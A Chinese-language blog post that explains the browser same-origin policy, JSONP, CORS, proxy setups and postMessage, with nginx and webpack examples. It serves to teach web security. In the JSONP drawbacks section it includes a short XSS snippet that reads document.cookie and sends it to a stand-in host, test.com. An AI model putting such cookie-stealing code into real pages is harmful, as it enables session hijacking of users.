---
title: 浏览器为何限制跨域访问？
categories:
 - Browser
tags:
 - 浏览器安全
 - 跨域
 - 同源策略
 - Same Origin Policy
 - JSONP
 - CORS
 - 代理
date: 2022-10-09
sidebar: 'auto'
---

## 前言
假如页面没有安全策略：
* Web是开放的，任何资源可以介入，自己网站可以加载并执行他人网站的脚本文件、图片、音视频等资源，甚至下载其他站点的可执行文件。
* 页面上行为没有任何限制造成无序混沌的局面、不可控。

打开一个银行站点，又打开一个恶意站点，恶意站点将可以做很多事情：
* 修改银行站点的DOM、CSSOM等信息；
* 在银行站点内部插入JavaScript脚本；
* 劫持用户登录的用户名和密码；
* 读取银行站点的Cookie、IndexDB等数据；
* 将信息上传至自己的服务器，伪造转账请求；

**没有安全策略的Web，我们是没有隐私的，所以需要安全策略来保障隐私和数据的安全。**<br/>
:::tip
页面中最基础、最核心的安全策略：同源策略（Same-origin policy）。
::: 

## 同源策略
两个URL => 协议（http）、域名（mobs.fun）、端口（80）相同 => URL同源。<br/>
浏览器默认同源之间可以**相互访问资源和操作DOM**，不同源之间若想要相互访问资源或者操作DOM，会有**一套基础的安全策略的制约**（同源策略）。<br/>
同源策略三个层面：
1. DOM层面 => 同源策略限制了不同源的JavaScript脚本对当前站点DOM对象读和写的操作。
2. 数据层面 => 同源策略限制了不同源的站点读取当前站点的Cookie、IndexDB、LocalStorage等数据。无法通过第二个页面的[opener](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/opener)来访问第一个页面中的Cookie、IndexDB、LocalStorage等数据。
3. 网络层面 => 同源策略限制了通过[XMLHttpRequest](../javascript/XMLHttpRequest.html)等方式将站点的数据发送给不同源的站点。

## 安全性和便利性的权衡
同源策略隔离了不同源的DOM、数据、网络通信，实现Web页面的安全性。<br/>
但是安全性和便利性是相互对立的，不同的源之间绝对隔离，可以说是最安全的措施，但这会让Web项目变得难以开发和使用。所以需要做出权衡，**出让一些安全性来满足灵活性。**<br/>
浏览器出让的同源策略的安全性有哪些：
1. 页面中可以嵌入第三方资源
2. 跨域资源共享
3. 跨文档消息机制

### 页面中可以嵌入第三方资源
同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有HTML文件、JavaScript文件、CSS文件、图片等资源都部署在同一台服务器上。这其实违背了Web的初衷，也带来了很多限制。比如我们需要引用不同CDN上的资源，域名其实是不同的，我们是需要同源策略支持页面任意引用外部文件，所以最初的浏览器都是支持引用外部资源文件的。<br/>
**JSONP跨域：**
* 只支持GET请求（script标签src限制get请求），利用了浏览器支持加载外部JavaScript资源文件时不受同源策略的限制。
* 需要服务端和前端配合。
```js
var newscript = document.createElement('script');
newscript.src = 'https://mobs.fun?callback=fn'
document.body.appendChild(newscript);
// 定义fn函数
function fn(data) {
  console.log(data);
}
// 服务端
// 监听请求参数callback，返回response资源 => fn({'服务端数据'})
// 返回的fn({'服务端数据'})作为JS脚本直接执行
```
**带来的弊端：**
* HTML文件注入恶意JavaScript脚本
* XSS攻击
```js
function onClick(){
 // 恶意脚本读取Cookie数据，并将其作为参数添加至恶意站点尾部。
 // 当打开该恶意页面时，恶意服务器就能接收到当前用户的Cookie信息。
 let url = `http://test.com?cookie=${document.cookie}`
 open(url)
}
onClick()
```
解决XSS攻击，浏览器中引入了[内容安全策略](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)（CSP），CSP的核心思想是**让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联JavaScript代码**。

### 跨域资源共享（CORS）
一般情况，通过XMLHttpRequest or Fetch来请求其他站点的资源，同源策略会阻止向其发出请求。为了解决这个问题，引入了[跨域资源共享](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)（Cross-Origin Resource Sharing），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。<br/>
* 传输HTTP头构成CORS。
* HTTP头决定浏览器是否能够跨域请求数据。
* 服务端增加HTTP头即可构成CORS。

实现：CORS将请求分为简单请求（Simple Requests）和预检请求（Preflighted requests）
1. [简单请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS) => GET、HEAD、POST<br/>
   * Accept
   * Accept-Language
   * Content-Language
   * Content-Type => application/x-www-form-urlencoded、multipart/form-data、text/plain
2. [预检请求](https://developer.mozilla.org/zh-CN/docs/Glossary/Preflight_request) => **可能对服务器数据产生副作用的HTTP请求方法**，浏览器会先自动向服务端发送一个OPTIONS请求，根据服务端返回的Access-Control-Allow-*判定是否允许发起实际的HTTP请求，在预检请求的返回中，服务器端也可通知客户端是否需要携带身份凭证（Cookies、HTTP认证相关数据）<br/>
   * Access-Control-Allow-Origin
   * Access-Control-Allow-Methods
   * Access-Control-Allow-Headers
   * Access-Control-Allow-Credentials

当请求的响应头符合上述条件，浏览器才发送并响应请求。
:::tip
Access-Control-Allow-Origin设置为*其实意义不大形同虚设，实际上线一般会将Access-Control-Allow-Origin值设为目标主机地址Host。
:::

### Proxy代理
代理（Proxy）也称网络代理：**允许一个客户端通过这个网络代理服务与另一个网络终端进行非直接的连接**。一些网关、路由器等网络设备支持网络代理。一般认为代理服务有利于保障网络终端的隐私安全，防止攻击。
:::tip
核心 => 借助同源的服务器去发送请求（请求代理转发），将跨域请求转换成同源请求。
:::
页面请求所在同域的服务器 => 服务器向目标服务器请求数据 => 返回给前端页面。
1. 配置Nginx实现代理
```json
server {
    listen  80;
    location /api {
      # 转发代理的目标服务器  
      proxy_pass  http://127.0.0.1:3000;
    }
}
```
2. 本地开发代理
借助webpack开启一个本地服务器作为代理服务器，借助代理服务器去请求目标服务器，结果转发回前端。<br/>
PS：**最终发布上线时如果web应用和接口服务器不在一起仍会跨域**。
```js
module.exports = {
    devServer: {
        host: '127.0.0.1',
        port: 8080,
        proxy: {
            // 告诉node，url前面是/api就使用代理
            '/api': { 
                // 目标服务器
                target: "http://xxx.xxx.xx.xx", 
                // 是否跨域
                changeOrigin: true,
                // 把实际Request Url中的/api用" "代替
                pathRewrite: { 
                    '^/api': " " 
                }
            }
        }
    }
}
// 配置axios发送请求的根路径
axios.defaults.baseURL = '/api'
```
### 跨文档消息机制
同源策略下，如果两个页面不同源的，则无法相互操纵DOM。实际情况下，经常需要两个不同源的DOM之间进行通信，所以浏览器中又引入了跨文档消息机制，可以通过JavaScript接口[window.postMessage](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage)来进行不同源的DOM通信。

## 总结
* 同源策略隔离不同源的DOM、数据、网络通信，实现Web页面的安全性。<br/>

目前在安全性和便利性权衡下的安全策略特点：
1. 页面可以引用第三方资源 => 暴露了很多安全问题（XSS攻击）=> 在此基础上引入了CSP来限制其自由程度。 
2. 使用XMLHttpRequest和Fetch是无法直接进行跨域请求的 => 浏览器在其基础上引入了**跨域资源共享策略**，让其安全地进行跨域操作。
3. 两个不同源的DOM不能相互操纵 => 浏览器中实现了**跨文档消息机制**让其安全地通信。
4. JSONP、请求代理等方案实现跨域。